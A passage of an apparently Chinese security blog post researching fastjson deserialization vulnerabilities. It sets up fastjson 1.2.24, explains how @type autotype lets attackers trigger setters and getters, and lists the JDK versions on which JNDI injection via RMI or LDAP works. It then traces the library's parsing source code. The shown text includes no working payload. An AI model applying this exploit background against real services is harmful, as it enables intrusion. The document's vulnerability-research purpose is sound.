<!DOCTYPE html><html lang="zh-Hans" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>Fastjson反序列化漏洞研究 | Tyaoo's Blog</title><meta name="keywords" content="漏洞研究"><meta name="author" content="Tyaoo"><meta name="copyright" content="Tyaoo"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="研究Fastjson各版本系列反序列化漏洞">
<meta property="og:type" content="article">
<meta property="og:title" content="Fastjson反序列化漏洞研究">
<meta property="og:url" content="https://tyaoo.github.io/2021/05/25/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/index.html">
<meta property="og:site_name" content="Tyaoo&#39;s Blog">
<meta property="og:description" content="研究Fastjson各版本系列反序列化漏洞">
<meta property="og:locale">
<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7">
<meta property="article:published_time" content="2021-05-24T17:14:57.000Z">
<meta property="article:modified_time" content="2022-02-15T09:13:58.443Z">
<meta property="article:author" content="Tyaoo">
<meta property="article:tag" content="漏洞研究">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://tyaoo.github.io/2021/05/25/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: 'Just',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Fastjson反序列化漏洞研究',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-02-15 17:13:58'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="Tyaoo's Blog" type="application/atom+xml">
</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">35</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">11</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div></div><hr/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Tyaoo's Blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Fastjson反序列化漏洞研究</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2021-05-24T17:14:57.000Z" title="Created 2021-05-25 01:14:57">2021-05-25</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2022-02-15T09:13:58.443Z" title="Updated 2022-02-15 17:13:58">2022-02-15</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Fastjson反序列化漏洞研究"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><blockquote>
<p>研究Fastjson各版本系列反序列化漏洞</p>
</blockquote>
<span id="more"></span>

<blockquote>
<p>源码：<a target="_blank" rel="noopener" href="https://github.com/alibaba/fastjson/wiki/Quick-Start-CN">https://github.com/alibaba/fastjson/wiki/Quick-Start-CN</a></p>
</blockquote>
<h2 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h2><p>推荐在maven中配置，在pom.xml中添加 </p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/com.alibaba/fastjson --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.24<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>fastjson通过parse、parseObject处理以json结构传入的类的字符串形时，会默认调用该类的共有setter与构造函数，并在合适的触发条件下调用该类的getter方法</p>
<p>当传入的类中setter、getter方法中存在利用点时，攻击者就可以通过传入可控的类的成员变量进行攻击利用</p>
<p>在1.2.25之后的版本中，fastjson默认关闭了反序列化任意类的操作，即<a target="_blank" rel="noopener" href="https://github.com/alibaba/fastjson/wiki/enable_autotype">AutoType</a>，对应的是json字符串中<code>&quot;@type&quot;</code>对应的值</p>
<p>JNDI注入可以利用RMI或者LDAP服务，高版本的jdk会限制这两个服务的开启，它们可利用的jdk版本如下：</p>
<ul>
<li>基于RMI的利用方式，适用jdk版本：<code>6u132</code>、<code>7u122</code>、 <code>8u113</code>之前</li>
<li>基于LDAP的利用方式，适用jdk版本：<code>6u211</code>、<code>7u201</code>、<code>8u191</code>、<code>11.0.1</code>之前</li>
</ul>
<h3 id="反序列化操作"><a href="#反序列化操作" class="headerlink" title="反序列化操作"></a>反序列化操作</h3><p><strong>序列化</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">text</span> <span class="operator">=</span> JSON.toJSONString(obj); </span><br></pre></td></tr></table></figure>

<p><strong>反序列化</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// parse()会识别并调用目标类的setter方法及某些特定条件的getter方法</span></span><br><span class="line"><span class="type">TestClass</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parse(<span class="string">&quot;&#123;json_str&#125;&quot;</span>); <span class="comment">// 返回JSONObject或JSONArray</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// parseObject() 等价于 parseObject() =&gt; JSON.toJSON(obj)</span></span><br><span class="line"><span class="comment">// parseObject()会调用反序列化目标类的所有setter和getter方法</span></span><br><span class="line"><span class="type">TestClass</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(<span class="string">&quot;&#123;json_str&#125;&quot;</span>); <span class="comment">// 只能返回JSONObject</span></span><br><span class="line"><span class="type">TestClass</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(<span class="string">&quot;&#123;json_str&#125;&quot;</span>, TestClass.class); <span class="comment">// 返回TestClass类对象</span></span><br></pre></td></tr></table></figure>

<h3 id="反序列化流程图"><a href="#反序列化流程图" class="headerlink" title="反序列化流程图"></a>反序列化流程图</h3><p>核心在于语法解析器</p>
<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202105232211af82d694dfca10657691.png" alt="image-20210523011132183" style="zoom:80%;" />

<h3 id="反序列化调用流程"><a href="#反序列化调用流程" class="headerlink" title="反序列化调用流程"></a>反序列化调用流程</h3><p>这里我把<code>parse()</code>函数作为例子，探究一下json字符串从反序列化开始后到对应属性的<code>set</code>方法的函数调用过程</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">JSON</span> <span class="keyword">implements</span> <span class="title class_">JSONStreamAware</span>, JSONAware &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">parse</span><span class="params">(String text)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> parse(text, DEFAULT_PARSER_FEATURE); <span class="comment">// 首先使用默认的feature进行反序列化</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">parse</span><span class="params">(String text, <span class="type">int</span> features)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (text == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">DefaultJSONParser</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultJSONParser</span>(text, ParserConfig.getGlobalInstance(), features); <span class="comment">// 获取默认配置后调用DefaultJSONParser()获取一个DefaultJSONParser</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> parser.parse();</span><br><span class="line">            parser.handleResovleTask(value);</span><br><span class="line">            parser.close();</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><code>ParserConfig.getGlobalInstance()</code>返回的是配置的全局变量</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ParserConfig</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> ParserConfig <span class="title function_">getGlobalInstance</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> global; <span class="comment">// 配置的全局变量</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>紧接着调用<code>DefaultJSONParser()</code>函数返回一个Lexer，就是一个语法解析器</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DefaultJSONParser</span> <span class="keyword">implements</span> <span class="title class_">Closeable</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">DefaultJSONParser</span><span class="params">(String input, ParserConfig config, <span class="type">int</span> features)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>(input, <span class="keyword">new</span> <span class="title class_">JSONScanner</span>(input, features), config); <span class="comment">// 初始化一个JSONLexer</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">DefaultJSONParser</span><span class="params">(Object input, JSONLexer lexer, ParserConfig config)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.dateFormatPattern = JSON.DEFFAULT_DATE_FORMAT;</span><br><span class="line">        <span class="built_in">this</span>.contextArrayIndex = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">this</span>.resolveStatus = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">this</span>.extraTypeProviders = <span class="literal">null</span>;</span><br><span class="line">        <span class="built_in">this</span>.extraProcessors = <span class="literal">null</span>;</span><br><span class="line">        <span class="built_in">this</span>.fieldTypeResolver = <span class="literal">null</span>;</span><br><span class="line">        <span class="built_in">this</span>.lexer = lexer;</span><br><span class="line">        <span class="built_in">this</span>.input = input;</span><br><span class="line">        <span class="built_in">this</span>.config = config;</span><br><span class="line">        <span class="built_in">this</span>.symbolTable = config.symbolTable;</span><br><span class="line">        <span class="type">int</span> <span class="variable">ch</span> <span class="operator">=</span> lexer.getCurrent(); <span class="comment">// 使用JSONLexer标记字符串中的&#x27;&#123;&#x27;和&#x27;[&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> (ch == <span class="string">&#x27;&#123;&#x27;</span>) &#123;</span><br><span class="line">            lexer.next();</span><br><span class="line">            ((JSONLexerBase)lexer).token = <span class="number">12</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ch == <span class="string">&#x27;[&#x27;</span>) &#123;</span><br><span class="line">            lexer.next();</span><br><span class="line">            ((JSONLexerBase)lexer).token = <span class="number">14</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            lexer.nextToken();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>其中<code>JSONScanner()</code>函数是用来获取BOM信息的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">JSONScanner</span> <span class="keyword">extends</span> <span class="title class_">JSONLexerBase</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">JSONScanner</span><span class="params">(String input, <span class="type">int</span> features)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(features);</span><br><span class="line">        <span class="built_in">this</span>.text = input;</span><br><span class="line">        <span class="built_in">this</span>.len = <span class="built_in">this</span>.text.length();</span><br><span class="line">        <span class="built_in">this</span>.bp = -<span class="number">1</span>;</span><br><span class="line">        <span class="built_in">this</span>.next(); <span class="comment">// 读字符串的BOM</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.ch == <span class="string">&#x27;\ufeff&#x27;</span>) &#123;</span><br><span class="line">            <span class="built_in">this</span>.next();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>获取完Lexer之后我们就进入到<code>parser.parse()</code>函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DefaultJSONParser</span> <span class="keyword">implements</span> <span class="title class_">Closeable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">parse</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.parse((Object)<span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">parse</span><span class="params">(Object fieldName)</span> &#123;</span><br><span class="line">        <span class="type">JSONLexer</span> <span class="variable">lexer</span> <span class="operator">=</span> <span class="built_in">this</span>.lexer;</span><br><span class="line">        <span class="keyword">switch</span>(lexer.token()) &#123; <span class="comment">// 根据token</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="number">11</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="number">15</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="number">16</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="number">17</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="number">18</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="number">19</span>:</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;syntax error, &quot;</span> + lexer.info());</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="type">Number</span> <span class="variable">intValue</span> <span class="operator">=</span> lexer.integerValue();</span><br><span class="line">            lexer.nextToken();</span><br><span class="line">            <span class="keyword">return</span> intValue;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> lexer.decimalValue(lexer.isEnabled(Feature.UseBigDecimal));</span><br><span class="line">            lexer.nextToken();</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            <span class="type">String</span> <span class="variable">stringLiteral</span> <span class="operator">=</span> lexer.stringVal();</span><br><span class="line">            lexer.nextToken(<span class="number">16</span>);</span><br><span class="line">            <span class="keyword">if</span> (lexer.isEnabled(Feature.AllowISO8601DateFormat)) &#123;</span><br><span class="line">                <span class="type">JSONScanner</span> <span class="variable">iso8601Lexer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONScanner</span>(stringLiteral);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (iso8601Lexer.scanISO8601DateIfMatch()) &#123;</span><br><span class="line">                        <span class="type">Date</span> <span class="variable">var11</span> <span class="operator">=</span> iso8601Lexer.getCalendar().getTime();</span><br><span class="line">                        <span class="keyword">return</span> var11;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    iso8601Lexer.close();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> stringLiteral;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">            lexer.nextToken();</span><br><span class="line">            <span class="keyword">return</span> Boolean.TRUE;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">            lexer.nextToken();</span><br><span class="line">            <span class="keyword">return</span> Boolean.FALSE;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">            lexer.nextToken();</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">            lexer.nextToken(<span class="number">18</span>);</span><br><span class="line">            <span class="keyword">if</span> (lexer.token() != <span class="number">18</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;syntax error&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            lexer.nextToken(<span class="number">10</span>);</span><br><span class="line">            <span class="built_in">this</span>.accept(<span class="number">10</span>);</span><br><span class="line">            <span class="type">long</span> <span class="variable">time</span> <span class="operator">=</span> lexer.integerValue().longValue();</span><br><span class="line">            <span class="built_in">this</span>.accept(<span class="number">2</span>);</span><br><span class="line">            <span class="built_in">this</span>.accept(<span class="number">11</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Date</span>(time);</span><br><span class="line">        <span class="keyword">case</span> <span class="number">12</span>: <span class="comment">// 识别到JsonObject</span></span><br><span class="line">            <span class="type">JSONObject</span> <span class="variable">object</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>(lexer.isEnabled(Feature.OrderedField));</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.parseObject((Map)object, fieldName);</span><br><span class="line">        <span class="keyword">case</span> <span class="number">14</span>: <span class="comment">// 识别到JsonArray</span></span><br><span class="line">            <span class="type">JSONArray</span> <span class="variable">array</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONArray</span>();</span><br><span class="line">            <span class="built_in">this</span>.parseArray((Collection)array, (Object)fieldName);</span><br><span class="line">            <span class="keyword">if</span> (lexer.isEnabled(Feature.UseObjectArray)) &#123;</span><br><span class="line">                <span class="keyword">return</span> array.toArray();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> array;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">20</span>:</span><br><span class="line">            <span class="keyword">if</span> (lexer.isBlankInput()) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;unterminated json string, &quot;</span> + lexer.info());</span><br><span class="line">        <span class="keyword">case</span> <span class="number">21</span>:</span><br><span class="line">            lexer.nextToken();</span><br><span class="line">            HashSet&lt;Object&gt; set = <span class="keyword">new</span> <span class="title class_">HashSet</span>();</span><br><span class="line">            <span class="built_in">this</span>.parseArray((Collection)set, (Object)fieldName);</span><br><span class="line">            <span class="keyword">return</span> set;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">22</span>:</span><br><span class="line">            lexer.nextToken();</span><br><span class="line">            TreeSet&lt;Object&gt; treeSet = <span class="keyword">new</span> <span class="title class_">TreeSet</span>();</span><br><span class="line">            <span class="built_in">this</span>.parseArray((Collection)treeSet, (Object)fieldName);</span><br><span class="line">            <span class="keyword">return</span> treeSet;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">23</span>:</span><br><span class="line">            lexer.nextToken();</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>跟进<code>JSONObject()</code>函数设置map</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JSONObject</span> <span class="keyword">extends</span> <span class="title class_">JSON</span> <span class="keyword">implements</span> <span class="title class_">Map</span>&lt;String, Object&gt;, Cloneable, Serializable, InvocationHandler &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">JSONObject</span><span class="params">(<span class="type">int</span> initialCapacity, <span class="type">boolean</span> ordered)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (ordered) &#123; <span class="comment">// 根据ordered特征选择HashMap</span></span><br><span class="line">            <span class="built_in">this</span>.map = <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>(initialCapacity);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.map = <span class="keyword">new</span> <span class="title class_">HashMap</span>(initialCapacity);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>下一步到调用最核心的<code>this.parseObject()</code>函数，整个函数都是在用Lexer提取出字符串中的键值和对应值，因为这个函数比较长，所以就不具体展示了，我们重点看判断<code>@type</code>字段的代码</p>
<blockquote>
<p>这里简单提一下lexer的相关操作，因为代码太长就不详细列出了：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">lexer.scanSymbol(<span class="built_in">this</span>.symbolTable, <span class="string">&#x27;&quot;&#x27;</span>); <span class="comment">// 用来提取双引号包括的内容</span></span><br><span class="line">lexer.nextToken(<span class="number">16</span>); <span class="comment">// 转移到expect为16的case分支，根据当前的字符设置新的token，如果没有找到就会调用this.nextToken();</span></span><br><span class="line">lexer.nextToken(); <span class="comment">// 根据当前的字符设置token</span></span><br></pre></td></tr></table></figure>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DefaultJSONParser</span> <span class="keyword">implements</span> <span class="title class_">Closeable</span> &#123;</span><br><span class="line">    </span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">final</span> Object <span class="title function_">parseObject</span><span class="params">(Map object, Object fieldName)</span> &#123;</span><br><span class="line">        </span><br><span class="line">        ...</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (key == JSON.DEFAULT_TYPE_KEY &amp;&amp; !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) &#123; <span class="comment">// JSON.DEFAULT_TYPE_KEY的值为@type</span></span><br><span class="line">            ref = lexer.scanSymbol(<span class="built_in">this</span>.symbolTable, <span class="string">&#x27;&quot;&#x27;</span>); <span class="comment">// 获取@type对应的类名</span></span><br><span class="line">            Class&lt;?&gt; clazz = TypeUtils.loadClass(ref, <span class="built_in">this</span>.config.getDefaultClassLoader()); <span class="comment">// 使用loadCLass()加载对应类</span></span><br><span class="line">            <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">                lexer.nextToken(<span class="number">16</span>);</span><br><span class="line">                <span class="keyword">if</span> (lexer.token() == <span class="number">13</span>) &#123;</span><br><span class="line">                    lexer.nextToken(<span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        instance = <span class="literal">null</span>;</span><br><span class="line">                        <span class="type">ObjectDeserializer</span> <span class="variable">deserializer</span> <span class="operator">=</span> <span class="built_in">this</span>.config.getDeserializer(clazz);</span><br><span class="line">                        <span class="keyword">if</span> (deserializer <span class="keyword">instanceof</span> JavaBeanDeserializer) &#123;</span><br><span class="line">                            instance = ((JavaBeanDeserializer)deserializer).createInstance(<span class="built_in">this</span>, clazz);</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> (instance == <span class="literal">null</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span> (clazz == Cloneable.class) &#123;</span><br><span class="line">                                instance = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">                            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;java.util.Collections$EmptyMap&quot;</span>.equals(ref)) &#123;</span><br><span class="line">                                instance = Collections.emptyMap();</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                instance = clazz.newInstance();</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        obj = instance;</span><br><span class="line">                        <span class="keyword">return</span> obj;</span><br><span class="line">                    &#125; <span 